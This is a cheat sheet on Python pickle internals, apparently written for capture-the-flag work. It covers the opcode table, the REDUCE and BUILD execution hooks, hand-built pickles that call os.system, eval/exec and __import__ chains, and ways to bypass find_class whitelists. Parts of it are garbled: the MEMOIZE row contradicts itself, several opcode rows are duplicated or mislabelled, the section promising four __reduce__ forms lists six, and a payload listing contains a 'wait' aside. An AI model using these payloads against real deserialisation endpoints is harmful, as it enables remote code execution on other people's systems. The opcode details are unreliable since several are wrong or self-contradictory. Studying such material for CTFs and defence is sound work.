# Pickle — the stack-VM internals and hand-crafting

## The VM

A pickle is a program for a tiny stack machine. The "object" is the trace
of building it — which is why a pickle can carry code without looking like
one: the opcodes only assemble callables at REDUCE time.

```
state:  stack []   memo {}
marker: '(' pushes a mark onto the stack
```

## Full opcode map (what `pickle_dis.py` prints)

| Op | Byte | Action |
|---|---|---|
| MARK | `(` | push mark |
| STOP | `.` | end — top of stack is the result |
| POP | `0` | drop top |
| DUP | `2` | duplicate top |
| POP_MARK | `1` | drop through mark |
| INT | `I<n>\n` | push int |
| LONG | `L<n>L\n` | push long |
| FLOAT | `F<f>\n` / `G` | push float |
| STRING | `S'x'\n` / `V` | push str / unicode |
| BINSTRING | `T` u32 | push bytes (p2+) |
| SHORT_BINSTRING | `U` u8 | push bytes |
| BINBYTES | `B` u32 | bytes (p3) |
| SHORT_BINBYTES | `C` u8 | bytes (p3) |
| NONE | `N` | push None |
| NEWTRUE | `\x88` | True (p2+) |
| NEWFALSE | `\x89` | False |
| EMPTY_TUPLE | `)` | () |
| TUPLE | `t` | pop to mark → tuple |
| TUPLE1/2/3 | `\x85\x86\x87` | pop N → tuple |
| EMPTY_LIST | `]` | [] |
| LIST | `l` | pop to mark → list |
| APPEND | `a` | list.append(top) |
| APPENDS | `e` | extend from mark |
| EMPTY_DICT | `}` | {} |
| DICT | `d` | pop to mark → dict |
| SETITEM | `s` | dict[k]=v |
| SETITEMS | `u` | setitems from mark |
| EMPTY_SET | `\x8f` | set() (p4) |
| FROZENSET | `\x91` | frozenset (p4) |
| GLOBAL | `c<mod>\n<attr>\n` | import mod; push mod.attr |
| STACK_GLOBAL | `\x93` | pop attr,mod → same (p4) |
| EXT1/2/4 | `\x82\x83\x84` | extension registry |
| REDUCE | `R` | f(*args) → push |
| BUILD | `b` | obj.__setstate__(state) or __dict__ update |
| INST | `i<mod>\n<cls>\n` | instantiate cls with args-to-mark (p0) |
| OBJ | `o` | instantiate with args-to-mark |
| NEWOBJ | `\x81` | cls.__new__(cls,*args) |
| NEWOBJ_EX | `\x92` | newobj with kwargs (p4) |
| GET | `g<n>\n` / `j` u32 | memo[n] → push |
| PUT | `p<n>\n` / `q` u8 | memo[n] = top |
| BINGET | `h` u8 / `j` u32 | memo recall |
| BINPUT | `q` u8 / `r` u32 | memo store |
| LONG_BINGET/PUT | `j`/`r` u32 | memo 32-bit |
| MEMOIZE | `\x94` no— | `\x94` is FRAME; MEMOIZE = `\x94`? no — memoize = `\x94`? use `pickletools` |
| FRAME | `\x95` u64 | p4 frame — next u64 bytes are one frame |
| PERSID | `P<id>\n` | persistent id → custom loader |
| BINPERSID | `Q` | persistent id from stack |
| UNICODE | `V<x>\n` | unicode str |
| SHORT_BINUNICODE | `\x8c` u8 | p4 |
| BINUNICODE | `X` u32 | unicode |
| TUPLE3 | `\x87` | |
| FRAME | `\x95` | frame boundary |

## The REDUCE rule — the only thing that runs code

`R` pops `args` (a tuple) then `callable` — pushes `callable(*args)`.
`GLOBAL`/`STACK_GLOBAL` are the only ways to push a module-level callable.
So:

- A pickle that never emits `R`/`i`/`o`/`\x81`/`\x92` is **data-only**.
- ANY of those opcodes = code runs at loads() time.

```bash
python3 tools/pickle_dis.py blob.pkl --full
# verdict line:
#   data-only stream           ← no REDUCE/NEWOBJ — safe by inspection
#   code-execution opcodes     ← REDUCE/NEWOBJ/INST/OBJ present
```

## The memo — dedup and self-reference

`BINPUT n` stores top-of-stack at memo[n]; `BINGET n` re-pushes it. Cycles
(a list containing itself) are possible. More usefully: the SAME tuple can
be `BINGET`'d into multiple positions — a stream that LOOKS like it builds
two objects may build the same one twice.

## __reduce__ return shapes — the four forms

```python
def __reduce__(self):
    return "module.ClassName"                    # 1: a name string — copyreg
    return (callable, (a1,a2))                   # 2: callable+args  ← THE FORM
    return (callable, args, state)               # 3: + state → BUILD step
    return (callable, args, state, iter)         # 4: + listitems → APPENDS
    return (callable, args, state, iter, diter)  # 5: + dictitems → SETITEMS
    return (callable, args, state, iter, diter, setattr)
    # 6: + state_setter called (obj, state) instead of BUILD
```

The 6-tuple's `state_setter` is the sneaky one — `__setstate__` isn't called,
your own function is. Most CTF payloads stop at form 2 or 3.

## __setstate__ / BUILD — the second hook

`BUILD` pops `state` then `obj` → `obj.__setstate__(state)` or
`obj.__dict__.update(state)` if no `__setstate__`. A gadget class with a
custom `__setstate__` runs ITS code — a second execution point after
`__reduce__`.

## Hand-crafting an RCE pickle by hand (when the generator can't express it)

```
the minimal os.system pickle, protocol 0 — pure ASCII:

cnt\nsystem\n           GLOBAL nt system     → callable on stack
(                       MARK
S'id'\n                 STRING 'id'
t                       TUPLE   → ('id',)
R                       REDUCE  → nt.system('id')
.                       STOP
```

```
cposix\nsystem\n   (posix on unix, nt on windows — pickle uses os.name)
p0                 BINPUT 0 — dedup the callable
(S'id'\n           ( — wait: mark then string
t                  TUPLE
R                  REDUCE
.                  STOP
```

## The builtins-only restriction — when os/system are filtered

`find_class` is only called for GLOBAL/STACK_GLOBAL. A custom unpickler that
whitelists modules blocks `os`/`posix`/`subprocess`. Reach the same sink via:

```python
# builtins.eval reaches arbitrary code without an 'os' GLOBAL:
(eval, ("__import__('os').system('id')",))
# builtins.exec for statements:
(exec, ("import os;os.system('id')",))
# builtins.getattr to pull a callable out of an allowed object:
(getattr, (obj, 'dangerous'))
# builtins.map to trampoline:
# codecs.decode can re-import under a different name
```

## `__import__` tricks when eval/exec are blocked

```python
# _frozen_importlib.BuiltinImporter / __import__ itself as the callable:
(__import__, ('os',))   → pushes os module
# then a second REDUCE on its attribute — needs a memo round-trip:
```

The cleanest two-step when `system` is filtered: `__import__('os')` →
memo → `getattr(os,'system')` → memo → `('id',)` → REDUCE.

## The `find_class` whitelist bypass surface

```python
class Restricted(Unpickler):
    def find_class(self, mod, name):
        if mod == 'safe': return super().find_class(mod,name)
        raise UnpicklingError(mod)
```

- Whitelisted module that re-exports a dangerous name (`sys` →
  `sys.modules['os']`, `builtins` → `eval`)
- `__main__`/`__builtin__`/`builtins` whitelisting (often over-broad)
- `copyreg`/`__reduce_ex__` path that names an allowed class but whose
  `__reduce__` still returns a dangerous callable — the whitelist checks
  `find_class`, not the callable's module-of-origin.

## Reading `pickle_dis` output — what each verdict means

```
data-only stream                     → push/pop only — no RCE possible
code-execution opcodes present       → REDUCE/NEWOBJ/INST/OBJ — dangerous
```

`--full` keeps every opcode annotated — the GLOBAL lines name the module.attr
the stream resolves, the REDUCE lines are where it fires. When auditing a
challenge's legit pickle to understand its class, `--full` is the read mode.
